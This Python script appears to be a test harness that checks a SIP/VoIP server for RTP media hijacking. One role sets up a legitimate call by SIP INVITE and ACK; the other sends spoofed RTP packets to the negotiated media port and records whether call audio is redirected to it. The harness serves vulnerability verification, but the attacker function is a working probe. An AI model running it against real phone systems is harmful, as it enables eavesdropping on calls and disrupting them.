#!/usr/bin/env python3
import argparse
import json
import os
import random
import re
import socket
import struct
import time
from pathlib import Path


def local_ip():
    return socket.gethostbyname(socket.gethostname())


def rtp_packet(seq, timestamp, marker):
    return struct.pack("!BBHII", 0x80, 0, seq, timestamp, 0x51515151) + bytes([marker]) * 160


def atomic_json(path, data):
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(data, indent=2) + "\n")
    tmp.replace(path)


def attacker(args):
    control = Path(args.artifacts) / f"{args.case}-control.json"
    result = Path(args.artifacts) / f"{args.case}-attacker.json"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", args.attacker_port))
    sock.setblocking(False)

    deadline = time.monotonic() + 15
    while not control.exists() and time.monotonic() < deadline:
        time.sleep(0.02)
    if not control.exists():
        raise SystemExit("timed out waiting for call control")

    target = json.loads(control.read_text())
    destination = (target["rtp_host"], target["rtp_port"])
    started = time.monotonic()
    for seq in range(1, 31):
        sock.sendto(rtp_packet(seq, seq * 160, 0x11), destination)
        time.sleep(0.002)

    packets = []
    deadline = started + 5
    while time.monotonic() < deadline:
        try:
            data, peer = sock.recvfrom(4096)
            packets.append({
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "bytes": len(data),
                "peer": list(peer),
                "echoed_attacker_marker": data[12:172] == bytes([0x11]) * 160,
            })
        except BlockingIOError:
            time.sleep(0.002)

    atomic_json(result, {
        "role": "attacker",
        "source": [local_ip(), args.attacker_port],
        "target": list(destination),
        "sent": 30,
        "received": len(packets),
        "echoed_attacker_marker_packets": sum(p["echoed_attacker_marker"] for p in packets),
        "first_received_ms": packets[0]["elapsed_ms"] if packets else None,
        "last_received_ms": packets[-1]["elapsed_ms"] if packets else None,
    })


def header(message, name):
    match = re.search(rf"(?im)^{re.escape(name)}:\s*(.+)$", message)
    return match.group(1).strip() if match else ""


def legitimate(args):
    artifacts = Path(args.artifacts)
    control = artifacts / f"{args.case}-control.json"
    result = artifacts / f"{args.case}-legitimate.json"
    ip = local_ip()
    call_id = f"{random.getrandbits(64):016x}@{ip}"
    branch = f"z9hG4bK-{random.getrandbits(48):012x}"
    tag = f"{random.getrandbits(32):08x}"

    sip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sip.bind(("0.0.0.0", args.sip_port))
    sip.settimeout(1)
    media = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    media.bind(("0.0.0.0", args.legitimate_port))
    media.setblocking(False)

    target_ip = socket.gethostbyname(args.target)
    sdp = "\r\n".join([
        "v=0", f"o=probe 1 1 IN IP4 {ip}", "s=RTP-source-check", f"c=IN IP4 {ip}",
        "t=0 0", f"m=audio {args.legitimate_port} RTP/AVP 0", "a=rtpmap:0 PCMU/8000", "a=sendrecv", "",
    ])
    invite = "\r\n".join([
        f"INVITE sip:{args.extension}@{args.target} SIP/2.0",
        f"Via: SIP/2.0/UDP {ip}:{args.sip_port};branch={branch};rport",
        "Max-Forwards: 70", f"From: <sip:probe@{ip}>;tag={tag}",
        f"To: <sip:{args.extension}@{args.target}>", f"Call-ID: {call_id}", "CSeq: 1 INVITE",
        f"Contact: <sip:probe@{ip}:{args.sip_port}>", "Content-Type: application/sdp",
        f"Content-Length: {len(sdp.encode())}", "", sdp,
    ]).encode()

    response = ""
    for _ in range(8):
        sip.sendto(invite, (target_ip, 5080))
        until = time.monotonic() + 1
        while time.monotonic() < until:
            try:
                candidate = sip.recvfrom(65535)[0].decode(errors="replace")
            except socket.timeout:
                break
            if candidate.startswith("SIP/2.0 200"):
                response = candidate
                break
            if candidate.startswith("SIP/2.0 4") or candidate.startswith("SIP/2.0 5"):
                raise SystemExit(candidate.split("\r\n", 1)[0])
        if response:
            break
    if not response:
        raise SystemExit("no SIP 200 response")

    rtp_host_match = re.search(r"(?im)^c=IN IP4 ([^\s]+)", response)
    rtp_port_match = re.search(r"(?im)^m=audio (\d+)", response)
    if not (rtp_host_match and rtp_port_match):
        raise SystemExit("SIP 200 lacked audio SDP")
    rtp_target = (rtp_host_match.group(1), int(rtp_port_match.group(1)))

    to_value = header(response, "To")
    ack = "\r\n".join([
        f"ACK sip:{args.extension}@{args.target} SIP/2.0",
        f"Via: SIP/2.0/UDP {ip}:{args.sip_port};branch={branch};rport", "Max-Forwards: 70",
        f"From: <sip:probe@{ip}>;tag={tag}", f"To: {to_value}", f"Call-ID: {call_id}",
        "CSeq: 1 ACK", f"Contact: <sip:probe@{ip}:{args.sip_port}>", "Content-Length: 0", "", "",
    ]).encode()
    sip.sendto(ack, (target_ip, 5080))

    atomic_json(control, {"rtp_host": rtp_target[0], "rtp_port": rtp_target[1], "call_id": call_id})
    started = time.monotonic()
    packets = []
    sent = 0
    next_send = started + 0.4
    deadline = started + 5
    while time.monotonic() < deadline:
        now = time.monotonic()
        if sent < 30 and now >= next_send:
            media.sendto(rtp_packet(1000 + sent, (1000 + sent) * 160, 0x22), rtp_target)
            sent += 1
            next_send += 0.02
        try:
            data, peer = media.recvfrom(4096)
            packets.append({
                "elapsed_ms": round((time.monotonic() - started) * 1000),
                "bytes": len(data),
                "peer": list(peer),
                "echoed_legitimate_marker": data[12:172] == bytes([0x22]) * 160,
            })
        except BlockingIOError:
            time.sleep(0.002)

    atomic_json(result, {
        "role": "legitimate",
        "source": [ip, args.legitimate_port],
        "sdp_advertised_source": [ip, args.legitimate_port],
        "target": list(rtp_target),
        "sent": sent,
        "received": len(packets),
        "received_after_legitimate_send": sum(p["elapsed_ms"] >= 400 for p in packets),
        "echoed_legitimate_marker_packets": sum(p["echoed_legitimate_marker"] for p in packets),
        "first_received_ms": packets[0]["elapsed_ms"] if packets else None,
        "last_received_ms": packets[-1]["elapsed_ms"] if packets else None,
        "sip_status": response.split("\r\n", 1)[0],
    })


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("role", choices=("attacker", "legitimate"))
    parser.add_argument("--target", default="before")
    parser.add_argument("--extension", default="5590")
    parser.add_argument("--case", required=True)
    parser.add_argument("--artifacts", default="/artifacts")
    parser.add_argument("--sip-port", type=int, default=5062)
    parser.add_argument("--legitimate-port", type=int, default=40000)
    parser.add_argument("--attacker-port", type=int, default=41000)
    args = parser.parse_args()
    (attacker if args.role == "attacker" else legitimate)(args)


if __name__ == "__main__":
    main()
